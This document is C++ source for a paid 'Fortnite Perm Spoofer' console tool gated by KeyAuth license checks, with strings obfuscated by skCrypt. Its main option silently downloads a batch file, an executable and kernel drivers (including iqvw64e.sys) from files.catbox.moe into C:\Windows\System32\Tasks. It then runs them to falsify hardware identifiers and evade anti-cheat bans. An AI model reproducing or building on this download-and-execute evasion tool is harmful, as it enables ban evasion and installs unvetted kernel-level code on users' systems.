#include <iostream>
#include <string>
#include <thread>
#include <Windows.h>
#include <filesystem>
#include <fstream>
#include <conio.h>  // Add this for _getch()
#include "auth.hpp"
#include "skCrypt.h"

using namespace KeyAuth;

// copy and paste from https://keyauth.cc/app/ and replace these string variables
// Please watch tutorial HERE https://www.youtube.com/watch?v=5x4YkTmFH-U
std::string Name = skCrypt( "name" ).decrypt( ); // App name
std::string OwnerId = skCrypt( "ownerid" ).decrypt( ); // Account ID
std::string Version = skCrypt( "1.0" ).decrypt( ); // Application version. Used for automatic downloads see video here https://www.youtube.com/watch?v=kW195PLCBKs
std::string Url = skCrypt( "https://keyauth.win/api/1.3/" ).decrypt( ); // change if using KeyAuth custom domains feature
std::string Path = skCrypt( "" ).decrypt( ); // (OPTIONAL) see tutorial here https://www.youtube.com/watch?v=I9rxt821gMk&t=1s

api KeyAuthApp( Name, OwnerId, Version, Url, Path );

using namespace std;

// Console color functions
void SetColor( int Color ) {
    SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), Color );
}

void PrintLoadingAnimation( const char * Message, int Seconds = 3 ) {
    const char * Spinner = "|/-\\";
    int Iterations = Seconds * 20; // 20 iterations per second
    for ( int i = 0; i < Iterations; i++ ) {
        printf( "\r%s %c", Message, Spinner[ i % 4 ] );
        Sleep( 50 ); // 50ms delay for smooth animation
    }
    printf( "\r%s [√]\n", Message );
}

void CheckAuthenticated( std::string OwnerId ) {
    while ( true ) {
        if ( GlobalFindAtomA( OwnerId.c_str( ) ) == 0 ) {
            SetColor( 12 ); // Red
            cout << "\n[!] Authentication check failed. Exiting..." << endl;
            exit( 13 );
        }
        Sleep( 1000 ); // thread interval
    }
}

void SessionStatus( ) {
    KeyAuthApp.check( true ); // do NOT specify true usually, it is slower and will get you blocked from API
    if ( !KeyAuthApp.response.success ) {
        SetColor( 12 ); // Red
        cout << "\n[!] Session check failed. Exiting..." << endl;
        exit( 0 );
    }

    if ( KeyAuthApp.response.isPaid ) {
        while ( true ) {
            Sleep( 20000 ); // this MUST be included or else you get blocked from API
            KeyAuthApp.check( );
            if ( !KeyAuthApp.response.success ) {
                SetColor( 12 ); // Red
                cout << "\n[!] Session expired. Exiting..." << endl;
                exit( 0 );
            }
        }
    }
}

void PrintBanner( ) {
    SetColor( 11 ); // Light Blue
    cout << R"(
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║  ███╗   ███╗███████╗███╗   ███╗██████╗ ███████╗ █████╗ ███╗   ██╗██╗ █████╗  ║
    ║  ████╗ ████║██╔════╝████╗ ████║██╔══██╗██╔════╝██╔══██╗████╗  ██║██║██╔══██╗ ║
    ║  ██╔████╔██║█████╗  ██╔████╔██║██████╔╝█████╗  ███████║██╔██╗ ██║██║███████║ ║
    ║  ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██║██║╚██╗██║██║██╔══██║ ║
    ║  ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║ ╚████║██║██║  ██║ ║
    ║  ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝ ║
    ║                                                                              ║
    ║                [ Fortnite Spoofer - Premium Perm Edition ]                   ║
    ║                                                                              ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    )" << endl;
}

std::string GetHiddenInput( ) {
    std::string input;
    char ch;
    while ( ( ch = _getch( ) ) != 13 ) { // 13 is the ASCII code for Enter
        if ( ch == 8 ) { // Backspace
            if ( !input.empty( ) ) {
                input.pop_back( );
                printf( skCrypt( "\b \b" ) ); // Move back, clear character, move back again
            }
        }
        else {
            input += ch;
            printf( skCrypt( "*" ) );
        }
    }
    printf( skCrypt( "\n" ) );
    return input;
}

std::string GetUsername( ) {
    char Username[ 256 ];
    DWORD Size = sizeof( Username );
    GetUserNameA( Username, &Size );
    return std::string( Username );
}

void PrintPrompt( ) {
    std::string Username = GetUsername( );
    SetColor( 11 ); // Light Blue
    printf( skCrypt( "[" ) );
    SetColor( 15 ); // White
    printf( skCrypt( "root" ) );
    SetColor( 12 ); // Red
    printf( skCrypt( "@" ) );
    SetColor( 15 ); // White
    printf( skCrypt( "%s" ), Username.c_str( ) );
    SetColor( 11 ); // Light Blue
    printf( skCrypt( "]" ) );
    printf( skCrypt( " -> " ) );
}

void PrintWithPrompt( const char * Message, int Color = 14 ) {
    std::cout << std::endl;
    PrintPrompt( );
    SetColor( Color );
    cout << Message;
}

int main( ) {
    // Set console to UTF-8 mode
    SetConsoleOutputCP( CP_UTF8 );
    SetConsoleCP( CP_UTF8 );

    SetConsoleTitleA( skCrypt( "MemberMania - Premium Fortnite Perm Spoofer" ) );
    system( skCrypt( "cls" ) );

    PrintBanner( );

    PrintWithPrompt( skCrypt( "Initializing authentication system..." ), 14 );

    KeyAuthApp.init( );
    if ( !KeyAuthApp.response.success ) {
        PrintWithPrompt( std::string( skCrypt( "Authentication Initializtion Failed: " ).decrypt( ) + KeyAuthApp.response.message ).c_str( ), 12 );
        Sleep( 1500 );
        exit( 1 );
    }

    SetColor( 11 );
    PrintWithPrompt( skCrypt( "Authentication system initialized successfully!" ), 11 );

    PrintWithPrompt( skCrypt( "Please enter your license key -> " ), 14 );
    SetColor( 15 );
    std::string Key = GetHiddenInput( );

    PrintLoadingAnimation( skCrypt( "Verifying License" ) );

    KeyAuthApp.license( Key );

    if ( KeyAuthApp.response.message.empty( ) ) {
        PrintWithPrompt( skCrypt( "Invalid license key format!" ), 12 );
        exit( 11 );
    }

    if ( !KeyAuthApp.response.success ) {
        PrintWithPrompt( std::string( skCrypt( "License verification failed: " ).decrypt( ) + KeyAuthApp.response.message ).c_str( ), 12 );
        Sleep( 2000 );
        exit( 1 );
    }

    PrintWithPrompt( skCrypt( "License verified successfully!" ), 10 );

    std::thread Run( CheckAuthenticated, OwnerId );
    // do NOT remove CheckAuthenticated(), it MUST stay for security reasons
    std::thread Check( SessionStatus ); // do NOT remove this function either.

    while ( true ) {
        system( skCrypt( "cls" ) );
        PrintBanner( );

        PrintWithPrompt( skCrypt( "[1] Spoof PC Hardware" ), 14 );
        PrintWithPrompt( skCrypt( "[2] Exit Application" ), 14 );
        std::cout << skCrypt( "\n" );
        PrintWithPrompt( skCrypt( "Select an option (1-2): " ), 14 );

        SetColor( 15 );
        int Option;
        cin >> Option;

        switch ( Option ) {
        case 1: {
            PrintWithPrompt( skCrypt( "Starting hardware spoofing process..." ), 14 );

            PrintLoadingAnimation( skCrypt( "Downloading required files" ) );

            system( skCrypt( "curl --silent https://files.catbox.moe/gv7xzv.bat --output C:\\Windows\\System32\\Tasks\\mac.bat >nul 2>&1" ) );
            system( skCrypt( "curl --silent https://files.catbox.moe/sdfbn8.sys --output C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE >nul 2>&1" ) );
            system( skCrypt( "curl --silent https://files.catbox.moe/n6i5j0.sys --output C:\\Windows\\System32\\Tasks\\winxsrcsv64.sys >nul 2>&1" ) );
            system( skCrypt( "curl --silent https://files.catbox.moe/j7goj8.sys --output C:\\Windows\\System32\\Tasks\\iqvw64e.sys >nul 2>&1" ) );

            PrintLoadingAnimation( skCrypt( "Applying hardware spoofs" ) );

            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /IVN %RANDOM%" ) );
            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /SK %RANDOM%" ) );
            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /CS %RANDOM%" ) );
            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /SU AUTO" ) );
            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /SS %RANDOM%" ) );
            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /BM %RANDOM%" ) );
            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /BLC %RANDOM%" ) );
            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /PPN %RANDOM%" ) );
            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /BS %RANDOM%" ) );
            system( skCrypt( "C:\\Windows\\System32\\Tasks\\winxsrcsv64.EXE /SM %RANDOM%" ) );

            PrintLoadingAnimation( skCrypt( "Finalizing spoof" ) );

            system( skCrypt( "C:\\Windows\\System32\\Tasks\\mac.bat >nul 2>&1" ) );

            Beep( 1000, 1000 );

            PrintWithPrompt( skCrypt( "Hardware spoofing completed successfully!" ), 10 );

            MessageBoxA( NULL, skCrypt( "Hardware spoofing completed successfully!\nYour PC has been spoofed." ).decrypt( ), skCrypt( "MemberMania API" ).decrypt( ), MB_OK | MB_ICONINFORMATION );
            break;
        }
        case 2: {
            PrintWithPrompt( skCrypt( "Exiting application..." ), 14 );
            Sleep( 1000 );
            exit( 0 );
        }
        default: {
            PrintWithPrompt( skCrypt( "Invalid option selected!" ), 12 );
            Sleep( 1000 );
            break;
        }
        }
    }
}